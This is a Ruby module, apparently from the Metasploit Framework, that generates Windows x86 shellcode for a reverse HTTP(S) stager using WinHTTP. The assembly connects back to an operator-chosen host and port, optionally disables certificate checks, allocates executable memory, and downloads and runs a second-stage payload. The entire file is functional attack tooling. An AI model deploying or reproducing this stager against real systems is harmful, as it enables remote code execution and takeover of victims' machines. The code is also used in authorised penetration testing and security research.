# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/block_api'
require 'msf/core/payload/windows/exitfunk'
require 'msf/core/payload/windows/reverse_http'

module Msf

###
#
# Complex payload generation for Windows ARCH_X86 that speak HTTP(S) using WinHTTP
#
###

module Payload::Windows::ReverseWinHttp

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows::ReverseHttp

  #
  # Generate the first stage
  #
  def generate(opts={})
    conf = {
      ssl:         opts[:ssl] || false,
      host:        datastore['LHOST'],
      port:        datastore['LPORT'],
      url:         generate_small_uri,
      retry_count: datastore['StagerRetryCount']
    }

    # Add extra options if we have enough space
    unless self.available_space.nil? || required_space > self.available_space
      conf[:url]              = generate_uri
      conf[:exitfunk]         = datastore['EXITFUNC']
      conf[:verify_cert_hash] = opts[:verify_cert_hash]
      conf[:proxy_host]       = datastore['PayloadProxyHost']
      conf[:proxy_port]       = datastore['PayloadProxyPort']
      conf[:proxy_user]       = datastore['PayloadProxyUser']
      conf[:proxy_pass]       = datastore['PayloadProxyPass']
      conf[:proxy_type]       = datastore['PayloadProxyType']
      conf[:retry_count]      = datastore['StagerRetryCount']
    end

    generate_reverse_winhttp(conf)
  end

  def transport_config(opts={})
    transport_config_reverse_http(opts)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_winhttp(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_winhttp(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # Add 100 bytes for the encoder to have some room
    space += 100

    # Make room for the maximum possible URL length (wchars)
    space += 512 * 2

    # proxy (wchars)
    space += 128 * 2

    # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
    space += 31

    # The final estimated size
    space
  end

  #
  # Convert a string into a NULL-terminated wchar byte array
  #
  def asm_generate_wchar_array(str)
    (str.to_s + "\x00").
      unpack("C*").
      pack("v*").
      unpack("C*").
      map{ |c| "0x%.2x" % c }.
      join(",")
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Bool] :ssl Whether or not to enable SSL
  # @option opts [String] :url The URI to request during staging
  # @option opts [String] :host The host to connect to
  # @option opts [Fixnum] :port The port to connect to
  # @option opts [String] :verify_cert_hash A 20-byte raw SHA-1 hash of the certificate to verify, or nil
  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
  # @option opts [Fixnum] :retry_count The number of times to retry a failed request before giving up
  #
  def asm_reverse_winhttp(opts={})

    retry_count       = [opts[:retry_count].to_i, 1].max
    verify_ssl        = nil
    encoded_cert_hash = nil
    encoded_url       = asm_generate_wchar_array(opts[:url])
    encoded_host      = asm_generate_wchar_array(opts[:host])

    if opts[:ssl] && opts[:verify_cert_hash]
      verify_ssl = true
      encoded_cert_hash = opts[:verify_cert_hash].unpack("C*").map{|c| "0x%.2x" % c }.join(",")
    end

    proxy_enabled = !!(opts[:proxy_host].to_s.strip.length > 0)
    proxy_info    = ""

    if proxy_enabled
      if opts[:proxy_type].to_s.downcase == "socks"
        proxy_info << "socks="
      else
        proxy_info << "http://"
      end

      proxy_info << opts[:proxy_host].to_s
      if opts[:proxy_port].to_i > 0
        proxy_info << ":#{opts[:proxy_port]}"
      end

      proxy_info = asm_generate_wchar_array(proxy_info)
    end

    proxy_user = opts[:proxy_user].to_s.length == 0 ? nil : asm_generate_wchar_array(opts[:proxy_user])
    proxy_pass = opts[:proxy_pass].to_s.length == 0 ? nil : asm_generate_wchar_array(opts[:proxy_pass])

    http_open_flags = 0
    secure_flags = 0

    if opts[:ssl]
      http_open_flags = (
        0x00800000 | # WINHTTP_FLAG_SECURE
        0x00000100 ) # WINHTTP_FLAG_BYPASS_PROXY_CACHE

      secure_flags = (
        0x00002000 | # SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
        0x00001000 | # SECURITY_FLAG_IGNORE_CERT_CN_INVALID
        0x00000200 | # SECURITY_FLAG_IGNORE_WRONG_USAGE
        0x00000100 ) # SECURITY_FLAG_IGNORE_UNKNOWN_CA
    else
      http_open_flags = (
        0x00000100 ) # WINHTTP_FLAG_BYPASS_PROXY_CACHE
    end

    asm = %Q^
      ; Input: EBP must be the address of 'api_call'.
      ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)

      load_winhttp:
        push 0x00707474        ; Push the string 'winhttp',0
        push 0x686E6977        ; ...
        push esp               ; Push a pointer to the "winhttp" string
        push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
        call ebp               ; LoadLibraryA( "winhttp" )
      ^

    if verify_ssl
      asm << %Q^
      load_crypt32:
        push 0x00323374        ; Push the string 'crypt32',0
        push 0x70797263        ; ...
        push esp               ; Push a pointer to the "crypt32" string
        push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
        call ebp               ; LoadLibraryA( "wincrypt" )
      ^
    end

    asm << %Q^
        xor ebx, ebx

      WinHttpOpen:
    ^

    if proxy_enabled
      asm << %Q^
        push ebx               ; Flags
        push esp               ; ProxyBypass ("")
      call get_proxy_server
        db #{proxy_info}
      get_proxy_server:
                               ; ProxyName (via call)
        push 3                 ; AccessType (NAMED_PROXY= 3)
        push ebx               ; UserAgent (NULL) [1]
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpOpen')}
        call ebp
      ^
    else
      asm << %Q^
        push ebx               ; Flags
        push ebx               ; ProxyBypass (NULL)
        push ebx               ; ProxyName (NULL)
        push ebx               ; AccessType (DEFAULT_PROXY= 0)
        push ebx               ; UserAgent (NULL) [1]
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpOpen')}
        call ebp
      ^
    end

    asm << %Q^
      WinHttpConnect:
        push ebx               ; Reserved (NULL)
        push #{opts[:port]}    ; Port [3]
        call got_server_uri    ; Double call to get pointer for both server_uri and
      server_uri:              ; server_host; server_uri is saved in edi for later
        db #{encoded_url}
      got_server_host:
        push eax               ; Session handle returned by WinHttpOpen
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpConnect')}
        call ebp

      WinHttpOpenRequest:

        push 0x#{http_open_flags.to_s(16)}
        push ebx               ; AcceptTypes (NULL)
        push ebx               ; Referrer (NULL)
        push ebx               ; Version (NULL)
        push edi               ; ObjectName (URI)
        push ebx               ; Verb (GET method) (NULL)
        push eax               ; Connect handle returned by WinHttpConnect
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpOpenRequest')}
        call ebp
        xchg esi, eax          ; save HttpRequest handler in esi
      ^

    if proxy_enabled && proxy_user
      asm << %Q^
        push ebx               ; pAuthParams (NULL)
      ^

      if proxy_pass
        asm << %Q^
        call got_proxy_pass    ; put proxy_pass on the stack
      proxy_pass:
        db #{proxy_pass}
      got_proxy_pass:
                               ; pwszPassword now on the stack
        ^
      else
        asm << %Q^
        push ebx               ; pwszPassword (NULL)
        ^
      end

      asm << %Q^
        call got_proxy_user    ; put proxy_user on the stack
      proxy_user:
        db #{proxy_user}
      got_proxy_user:
                               ; pwszUserName now on the stack
        push 1                 ; AuthScheme (WINHTTP_AUTH_SCHEME_BASIC = 1)
        push 1                 ; AuthTargets (WINHTTP_AUTH_TARGET_PROXY = 1)
        push esi               ; hRequest
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetCredentials')}
        call ebp
      ^
    end

    if opts[:ssl]
      asm << %Q^
      ; WinHttpSetOption (hInternet, WINHTTP_OPTION_SECURITY_FLAGS, &buffer, sizeof(buffer) );
      set_security_options:
        push 0x#{secure_flags.to_s(16)}
        mov eax, esp
        push 4                 ; sizeof(buffer)
        push eax               ; &buffer
        push 31                ; DWORD dwOption (WINHTTP_OPTION_SECURITY_FLAGS)
        push esi               ; hHttpRequest
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetOption')}
        call ebp
      ^
    end

    asm << %Q^
      ; Store our retry counter in the edi register
      set_retry:
        push #{retry_count}
        pop edi

      send_request:

      WinHttpSendRequest:
        push ebx               ; Context [7]
        push ebx               ; TotalLength [6]
        push ebx               ; OptionalLength (0) [5]
        push ebx               ; Optional (NULL) [4]
        push ebx               ; HeadersLength (0) [3]
        push ebx               ; Headers (NULL) [2]
        push esi               ; HttpRequest handle returned by WinHttpOpenRequest [1]
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSendRequest')}
        call ebp
        test eax,eax
        jnz check_response     ; if TRUE call WinHttpReceiveResponse API

      try_it_again:
        dec edi
        jnz send_request

      ; if we didn't allocate before running out of retries, fall through
      ^

      if opts[:exitfunk]
        asm << %Q^
      failure:
        call exitfunk
        ^
      else
        asm << %Q^
      failure:
        push 0x56A2B5F0        ; hardcoded to exitprocess for size
        call ebp
        ^
      end

      # Jump target if the request was sent successfully
      asm << %Q^
      check_response:
      ^

      # Verify the SSL certificate hash
      if verify_ssl

        asm << %Q^
      ssl_cert_get_context:
        push 4
        mov ecx, esp         ; Allocate &bufferLength
        push 0
        mov ebx, esp         ; Allocate &buffer (ebx will point to *pCert)

        push ecx             ; &bufferLength
        push ebx             ; &buffer
        push 78              ; DWORD dwOption (WINHTTP_OPTION_SERVER_CERT_CONTEXT)
        push esi             ; hHttpRequest
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpQueryOption')}
        call ebp
        test eax, eax        ;
        jz failure           ; Bail out if we couldn't get the certificate context

                             ; ebx
      ssl_cert_allocate_hash_space:
        push 20              ;
        mov ecx, esp         ; Store a reference to the address of 20
        sub esp,[ecx]        ; Allocate 20 bytes for the hash output
        mov edi, esp         ; edi will point to our buffer

      ssl_cert_get_server_hash:
        push ecx             ; &bufferLength
        push edi             ; &buffer (20-byte SHA1 hash)
        push 3               ; DWORD dwPropId (CERT_SHA1_HASH_PROP_ID)
        push [ebx]           ; *pCert
        push #{Rex::Text.block_api_hash('crypt32.dll', 'CertGetCertificateContextProperty')}
        call ebp
        test eax, eax        ;
        jz failure           ; Bail out if we couldn't get the certificate context

      ssl_cert_start_verify:
        call ssl_cert_compare_hashes
        db #{encoded_cert_hash}

      ssl_cert_compare_hashes:
        pop ebx              ; ebx points to our internal 20-byte certificate hash (overwrites *pCert)
                             ; edi points to the server-provided certificate hash

        push 4               ; Compare 20 bytes (5 * 4) by repeating 4 more times
        pop ecx              ;
        mov edx, ecx         ; Keep a reference to 4 in edx

      ssl_cert_verify_compare_loop:
        mov eax, [ebx]       ; Grab the next DWORD of the hash
        cmp eax, [edi]       ; Compare with the server hash
        jnz failure          ; Bail out if the DWORD doesn't match
        add ebx, edx         ; Increment internal hash pointer by 4
        add edi, edx         ; Increment server hash pointer by 4
        loop ssl_cert_verify_compare_loop

      ; Our certificate hash was valid, hurray!
      ssl_cert_verify_cleanup:
        xor ebx, ebx         ; Reset ebx back to zero
        ^
      end

      asm << %Q^
      receive_response:
                               ; The API WinHttpReceiveResponse needs to be called
                               ; first to get a valid handle for WinHttpReadData
        push ebx               ; Reserved (NULL)
        push esi               ; Request handler returned by WinHttpSendRequest
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpReceiveResponse')}
        call ebp
        test eax,eax
        jz failure

      allocate_memory:
        push 0x40              ; PAGE_EXECUTE_READWRITE
        push 0x1000            ; MEM_COMMIT
        push 0x00400000        ; Stage allocation (4Mb ought to do us)
        push ebx               ; NULL as we dont care where the allocation is
        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
        call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

      download_prep:
        xchg eax, ebx          ; place the allocated base address in ebx
        push ebx               ; store a copy of the stage base address on the stack
        push ebx               ; temporary storage for bytes read count
        mov edi, esp           ; &bytesRead

      download_more:
        push edi               ; NumberOfBytesRead (bytesRead)
        push 8192              ; NumberOfBytesToRead
        push ebx               ; Buffer
        push esi               ; Request handler returned by WinHttpReceiveResponse
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpReadData')}
        call ebp

        test eax,eax           ; if download failed? (optional?)
        jz failure

        mov eax, [edi]
        add ebx, eax           ; buffer += bytes_received

        test eax,eax           ; optional?
        jnz download_more      ; continue until it returns 0
        pop eax                ; clear the temporary storage

      execute_stage:
        ret                    ; dive into the stored stage address

      got_server_uri:
        pop edi
        call got_server_host   ; put the server_host on the stack (WinHttpConnect API [2])

      server_host:
        db #{encoded_host}
    ^

    if opts[:exitfunk]
      asm << asm_exitfunk(opts)
    end

    asm
  end

end

end

